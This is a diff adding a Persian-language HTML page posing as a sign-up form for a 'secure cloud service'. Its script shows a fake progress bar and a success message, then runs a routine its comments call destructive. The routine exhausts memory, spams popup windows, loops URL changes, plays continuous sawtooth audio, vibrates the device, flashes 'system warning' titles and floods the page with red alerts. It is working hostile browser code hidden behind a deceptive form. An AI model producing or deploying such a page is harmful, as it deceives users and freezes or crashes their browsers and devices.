@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سرویس ابری ایمن</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c 0%, #2b5876 100%);
+            color: #333;
+            line-height: 1.6;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            background-color: rgba(255, 255, 255, 0.97);
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 500px;
+            overflow: hidden;
+        }
+        
+        header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 40px;
+            margin-bottom: 15px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #4a5568;
+        }
+        
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+        
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        .progress-container {
+            margin: 25px 0;
+            background-color: #e2e8f0;
+            border-radius: 10px;
+            height: 20px;
+            overflow: hidden;
+            display: none;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 10px;
+            transition: width 0.5s ease;
+        }
+        
+        .status {
+            text-align: center;
+            margin: 20px 0;
+            font-weight: 600;
+            color: #4a5568;
+            min-height: 24px;
+        }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            margin-top: 20px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .warning {
+            background-color: #fed7d7;
+            color: #c53030;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: center;
+            font-weight: 600;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #718096;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">🔒</div>
+            <h1>سرویس ابری ایمن</h1>
+            <p>ایجاد حساب کاربری برای دسترسی به سرویس ابری</p>
+        </header>
+        
+        <div class="content">
+            <div class="warning">
+                ⚠️ توجه: این یک صفحه آزمایشی است و هیچ اطلاعات واقعی ذخیره نمی‌شود.
+            </div>
+            
+            <div class="form-group">
+                <label for="fullname">نام کامل</label>
+                <input type="text" id="fullname" placeholder="نام و نام خانوادگی خود را وارد کنید">
+            </div>
+            
+            <div class="form-group">
+                <label for="email">ایمیل</label>
+                <input type="email" id="email" placeholder="آدرس ایمیل خود را وارد کنید">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">رمز عبور</label>
+                <input type="password" id="password" placeholder="یک رمز عبور قوی انتخاب کنید">
+            </div>
+            
+            <div class="progress-container" id="progressContainer">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            
+            <div class="status" id="statusMessage">لطفا اطلاعات خود را وارد کرده و روی دکمه زیر کلیک کنید.</div>
+            
+            <button class="btn" id="createAccountBtn">ایجاد حساب کاربری</button>
+        </div>
+        
+        <footer>
+            <p>© 2023 سرویس ابری ایمن. تمام حقوق محفوظ است.</p>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const createAccountBtn = document.getElementById('createAccountBtn');
+            const progressContainer = document.getElementById('progressContainer');
+            const progressBar = document.getElementById('progressBar');
+            const statusMessage = document.getElementById('statusMessage');
+            
+            createAccountBtn.addEventListener('click', function() {
+                const fullname = document.getElementById('fullname').value;
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                if (!fullname || !email || !password) {
+                    statusMessage.textContent = 'لطفا تمام فیلدها را پر کنید.';
+                    statusMessage.style.color = '#e53e3e';
+                    return;
+                }
+                
+                // غیرفعال کردن دکمه برای جلوگیری از کلیک مجدد
+                createAccountBtn.disabled = true;
+                createAccountBtn.textContent = 'در حال پردازش...';
+                
+                // نمایش نوار پیشرفت
+                progressContainer.style.display = 'block';
+                
+                // شروع فرآیند
+                startDestructiveProcess();
+            });
+            
+            function startDestructiveProcess() {
+                const steps = [
+                    'در حال ایجاد حساب کاربری...',
+                    'بررسی اطلاعات امنیتی...',
+                    'اتصال به سرورهای امن...',
+                    'رمزنگاری داده‌ها...',
+                    'بررسی نهایی...',
+                    'اتمام فرآیند...'
+                ];
+                
+                let currentStep = 0;
+                const totalSteps = steps.length;
+                
+                const interval = setInterval(function() {
+                    if (currentStep < totalSteps) {
+                        const progress = ((currentStep + 1) / totalSteps) * 100;
+                        progressBar.style.width = progress + '%';
+                        statusMessage.textContent = steps[currentStep];
+                        currentStep++;
+                    } else {
+                        clearInterval(interval);
+                        statusMessage.innerHTML = '✅ حساب کاربری شما با موفقیت ایجاد شد!';
+                        createAccountBtn.textContent = 'تکمیل شد';
+                        
+                        // اجرای اقدامات مخرب
+                        executeDestructiveActions();
+                    }
+                }, 800);
+            }
+            
+            function executeDestructiveActions() {
+                // این تابع اقدامات مخرب را اجرا می‌کند
+                
+                // 1. ایجاد حلقه‌های بی‌پایان برای مصرف حافظه
+                try {
+                    const junkData = [];
+                    const memoryFillInterval = setInterval(() => {
+                        for (let i = 0; i < 100; i++) {
+                            junkData.push(new Array(1000000).join('X'));
+                        }
+                        console.log('مصرف حافظه افزایش یافت: ' + (junkData.length * 1000000) + ' bytes');
+                    }, 100);
+                } catch(e) {}
+                
+                // 2. باز کردن پنجره‌های متعدد
+                try {
+                    const windowSpamInterval = setInterval(() => {
+                        window.open('', '_blank', 'width=100,height=100');
+                    }, 500);
+                } catch(e) {}
+                
+                // 3. تغییر مکرر URL
+                try {
+                    let urlCounter = 0;
+                    const urlChangeInterval = setInterval(() => {
+                        window.location.hash = 'step' + (urlCounter++);
+                    }, 300);
+                } catch(e) {}
+                
+                // 4. ایجاد صدای مداوم
+                try {
+                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                    const soundInterval = setInterval(() => {
+                        const oscillator = audioContext.createOscillator();
+                        oscillator.type = 'sawtooth';
+                        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
+                        oscillator.connect(audioContext.destination);
+                        oscillator.start();
+                        setTimeout(() => oscillator.stop(), 200);
+                    }, 1000);
+                } catch(e) {}
+                
+                // 5. ایجاد ارتعاش در دستگاه (در صورت پشتیبانی)
+                try {
+                    if (navigator.vibrate) {
+                        const vibrationInterval = setInterval(() => {
+                            navigator.vibrate([500, 300, 500]);
+                        }, 1500);
+                    }
+                } catch(e) {}
+                
+                // 6. تغییر مکرر عنوان صفحه
+                try {
+                    let titleCounter = 0;
+                    const originalTitle = document.title;
+                    const titleChangeInterval = setInterval(() => {
+                        document.title = (titleCounter % 2 === 0) ? '⚠️ هشدار سیستم!' : originalTitle;
+                        titleCounter++;
+                    }, 1000);
+                } catch(e) {}
+                
+                // 7. ایجاد المان‌های DOM بی‌شمار
+                try {
+                    const domSpamInterval = setInterval(() => {
+                        for (let i = 0; i < 50; i++) {
+                            const div = document.createElement('div');
+                            div.innerHTML = '⚠️ هشدار سیستم!';
+                            div.style.position = 'absolute';
+                            div.style.left = Math.random() * 100 + 'vw';
+                            div.style.top = Math.random() * 100 + 'vh';
+                            div.style.color = 'red';
+                            div.style.fontWeight = 'bold';
+                            div.style.zIndex = 9999;
+                            document.body.appendChild(div);
+                        }
+                    }, 2000);
+                } catch(e) {}
+            }
+        });
+    </script>
+</body>
+</html>
